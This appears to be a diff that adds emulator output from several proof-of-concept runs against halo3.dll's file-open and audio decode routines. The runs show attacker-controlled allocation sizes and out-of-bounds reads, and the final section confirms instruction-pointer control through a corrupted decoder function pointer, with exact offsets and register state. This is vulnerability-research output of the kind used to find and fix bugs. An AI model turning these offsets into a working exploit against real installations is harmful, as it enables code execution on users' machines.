@@ -1,0 +1,211 @@
+================================================================ poc_v2_numsamples_oob
+[*] mapped halo3.dll @ 0x180000000 (size 0x4768000)
+[*] driving FSB open halo3+0x4e95d0 on 68-byte file (mode_arg=0x0)
+[*] instructions executed: 278
+[!] ATTACKER-CONTROLLED ALLOCATION SIZE: 0xfffffffc (memalloc(0xfffffffc))
+[*] call path (tail): 0x46b590 stub 0x4e9160 stub 0x461ff0 stub 0xcbd0 stub 0x4e92e0 0x461ff0 stub 0x46b590 stub 0x461ff0 stub
+
+########################## FAULT ##########################
+  type        : read-unmapped
+  fault addr  : 0x0000000300003000
+  vs alloc    : memalloc(0x8) @0x300002ff0 (intended size 0x8, mapped 0x10)
+  OOB distance: 0x10 past object base
+  faulting RIP: 0x00000001804e93e8  (halo3+0x4e93e8)
+
+==================== REGISTER STATE AT FAULT ====================
+  rip = 0x00000001804e93e8 (halo3+0x4e93e8)
+  rsp = 0x00000007f01ff638
+  rbp = 0x00000007f01ff778
+  rax = 0x0000000000000010
+  rbx = 0x0000000200020000
+  rcx = 0x0000000180a318a0 (halo3+0xa318a0)
+  rdx = 0x00000000fffffffc
+  rsi = 0x0000000300004008
+  rdi = 0x0000000000000002
+  r8  = 0x000000018083f5b0 (halo3+0x83f5b0)
+  r9  = 0x000000000000016c
+  r10 = 0x0000000300003000
+  r11 = 0x0000000000000000
+  r12 = 0x0000000000000008   <= input@0xc (8-byte LE)
+  r13 = 0x0000000000000010
+  r14 = 0x0000000300002ff0
+  r15 = 0x0000000000000018
+
+  stack @ rsp:
+    [rsp+0x00] = 0x0000000000000000
+    [rsp+0x08] = 0x0000000000000000
+    [rsp+0x10] = 0x0000000000000000
+    [rsp+0x18] = 0x0000000000000000
+    [rsp+0x20] = 0x0000000000000000
+    [rsp+0x28] = 0x0000000000000000
+    [rsp+0x30] = 0x0000000300004000
+    [rsp+0x38] = 0x0000000300000ff0
+
+================================================================ poc_v4_shsize_huge
+[*] mapped halo3.dll @ 0x180000000 (size 0x4768000)
+[*] driving FSB open halo3+0x4e95d0 on 592-byte file (mode_arg=0x0)
+[*] instructions executed: 224
+[!] ATTACKER-CONTROLLED ALLOCATION SIZE: 0x7ffffff0 (memalloc(0x7ffffff0))  size<=input input@0xc (8-byte LE)
+[*] call path (tail): 0x46b590 stub 0x4e9160 stub 0x461ff0 stub 0xcbd0 stub 0x4e92e0 0x461ff0 stub 0x46b590 stub
+
+########################## FAULT ##########################
+  type        : UcError: Invalid memory write (UC_ERR_WRITE_UNMAPPED)
+  fault addr  : 0x0000000000000000
+  faulting RIP: 0x000000018046b590  (OUTSIDE IMAGE)
+
+==================== REGISTER STATE AT FAULT ====================
+  rip = 0x000000018046b590 (halo3+0x46b590)
+  rsp = 0x00000007f01ff630
+  rbp = 0x00000007f01ff778
+  rax = 0x0000000300002000
+  rbx = 0x0000000200020000
+  rcx = 0x0000000200020000
+  rdx = 0x0000000300002000
+  rsi = 0x0000000000000005
+  rdi = 0x0000000000000000
+  r8  = 0x0000000000000001   <= input@0x1c (8-byte LE)
+  r9  = 0x000000007ffffff0   <= input@0xc (8-byte LE)
+  r10 = 0x0000000000000000
+  r11 = 0x0000000000000000
+  r12 = 0x0000000300000ff0
+  r13 = 0x0000000300000fe8
+  r14 = 0x0000000300002000
+  r15 = 0x0000000000000000
+
+  stack @ rsp:
+    [rsp+0x00] = 0x00000001804e935b
+    [rsp+0x08] = 0x0000000000000000
+    [rsp+0x10] = 0x0000000000000000
+    [rsp+0x18] = 0x0000000000000000
+    [rsp+0x20] = 0x0000000000000000
+    [rsp+0x28] = 0x0000000000000000
+    [rsp+0x30] = 0x0000000000000000
+    [rsp+0x38] = 0x0000000000000000
+
+================================================================ poc_v1_chunkwalk_oob
+[*] mapped halo3.dll @ 0x180000000 (size 0x4768000)
+[*] driving FSB open halo3+0x4e95d0 on 80-byte file (mode_arg=0x0)
+[*] instructions executed: 285
+[*] call path (tail): 0x46b590 stub 0x4e9160 stub 0x461ff0 stub 0xcbd0 stub 0x4e92e0 0x461ff0 stub 0x46b590 stub 0x461ff0 stub
+
+########################## FAULT ##########################
+  type        : read-unmapped
+  fault addr  : 0x0000000300802feb
+  faulting RIP: 0x00000001804e9400  (halo3+0x4e9400)
+
+==================== REGISTER STATE AT FAULT ====================
+  rip = 0x00000001804e9400 (halo3+0x4e9400)
+  rsp = 0x00000007f01ff638
+  rbp = 0x00000007f01ff778
+  rax = 0x00000000007fffff
+  rbx = 0x0000000008ffff01
+  rcx = 0x0000000180a318a0 (halo3+0xa318a0)
+  rdx = 0x0000000000000004
+  rsi = 0x0000000300004ff0
+  rdi = 0x0000000000000000
+  r8  = 0x000000018083f5b0 (halo3+0x83f5b0)
+  r9  = 0x000000000000016c
+  r10 = 0x0000000300802feb
+  r11 = 0x00000000007fffff
+  r12 = 0x0000000000000008
+  r13 = 0x0000000000000010
+  r14 = 0x0000000300002fe0
+  r15 = 0x0000000000000018
+
+  stack @ rsp:
+    [rsp+0x00] = 0x0000000000000000
+    [rsp+0x08] = 0x0000000000000000
+    [rsp+0x10] = 0x0000000000000000
+    [rsp+0x18] = 0x0000000000000000
+    [rsp+0x20] = 0x0000000000000000
+    [rsp+0x28] = 0x0000000000000000
+    [rsp+0x30] = 0x0000000300004ff0
+    [rsp+0x38] = 0x0000000300000ff0
+
+================================================================ poc_v3_type6_bigsize
+[*] mapped halo3.dll @ 0x180000000 (size 0x4768000)
+[*] driving FSB open halo3+0x4e95d0 on 104-byte file (mode_arg=0x0)
+[*] instructions executed: 343
+[*] call path (tail): 0x46b590 stub 0x4e9160 stub 0x461ff0 stub 0xcbd0 stub 0x4e92e0 0x461ff0 stub 0x46b590 stub 0x461ff0 stub
+
+########################## FAULT ##########################
+  type        : read-unmapped
+  fault addr  : 0x0000000300003000
+  vs alloc    : memalloc(0x2c) @0x300002fd0 (intended size 0x2c, mapped 0x30)
+  OOB distance: 0x30 past object base
+  faulting RIP: 0x00000001804e94c0  (halo3+0x4e94c0)
+
+==================== REGISTER STATE AT FAULT ====================
+  rip = 0x00000001804e94c0 (halo3+0x4e94c0)
+  rsp = 0x00000007f01ff638
+  rbp = 0x00000007f01ff778
+  rax = 0x0000000000000003
+  rbx = 0x000000000dffff00
+  rcx = 0x00000000003fffff
+  rdx = 0x0000000000000008
+  rsi = 0x0000000300004ff0
+  rdi = 0x0000000000000000
+  r8  = 0x0000000000000008
+  r9  = 0x00000000003ffffc
+  r10 = 0x0000000300002fdc
+  r11 = 0x0000000000ffffff
+  r12 = 0x0000000000000008
+  r13 = 0x0000000000000010
+  r14 = 0x0000000300002fd0
+  r15 = 0x0000000000000018
+
+  stack @ rsp:
+    [rsp+0x00] = 0x0000000000000000
+    [rsp+0x08] = 0x0000000000000000
+    [rsp+0x10] = 0x0000000000000000
+    [rsp+0x18] = 0x0000000000000000
+    [rsp+0x20] = 0x0000000000000000
+    [rsp+0x28] = 0x0000000000000000
+    [rsp+0x30] = 0x0000000300004ff0
+    [rsp+0x38] = 0x0000000300000ff0
+
+================================================================ DECODE PATH: RIP control (instance+0xa8 corrupted)
+[*] driving decode dispatcher halo3+0x500e00
+    instance+0xa8 (decode fn-ptr) = 0x4141414141414141  <-- corrupted/tagged
+    instance+0x80 (decode fn-ptr) = 0x4242424242424242  <-- corrupted/tagged
+[*] instructions executed: 26
+[*] call path (tail): icall@0x500e52
+
+########################## FAULT ##########################
+  *** RIP CONTROL CONFIRMED ***
+  readData (halo3+0x500e00) performed an INDIRECT CALL through the
+  codec instance's decoder function pointer, with NO CFG check,
+  and execution was redirected to the attacker value at instance+0xa8.
+  RIP = 0x4141414141414141  (= the planted pointer, byte-for-byte)
+  type        : FETCH-unmapped (PC CONTROL)
+  fault addr  : 0x0001414141414141
+  faulting RIP: 0x4141414141414141  (OUTSIDE IMAGE)
+
+==================== REGISTER STATE AT FAULT ====================
+  rip = 0x4141414141414141
+  rsp = 0x00000007f01ff760
+  rbp = 0x0000000000000000
+  rax = 0x0000000000000000
+  rbx = 0x0000000200040000
+  rcx = 0x0000000200040000
+  rdx = 0x0000000000000000
+  rsi = 0x0000000000001000
+  rdi = 0x0000000000000000
+  r8  = 0x00000007f01ff790
+  r9  = 0x0000000200051000
+  r10 = 0x0000000000000000
+  r11 = 0x00000007f01ff800
+  r12 = 0x0000000200050000
+  r13 = 0x0000000000000000
+  r14 = 0x0000000000000000
+  r15 = 0x0000000000000000
+
+  stack @ rsp:
+    [rsp+0x00] = 0x0000000180500e58
+    [rsp+0x08] = 0x0000000000000000
+    [rsp+0x10] = 0x0000000000000000
+    [rsp+0x18] = 0x0000000000000000
+    [rsp+0x20] = 0x0000000000000000
+    [rsp+0x28] = 0x0000000000000000
+    [rsp+0x30] = 0x0000000000000000
+    [rsp+0x38] = 0x0000000000000000
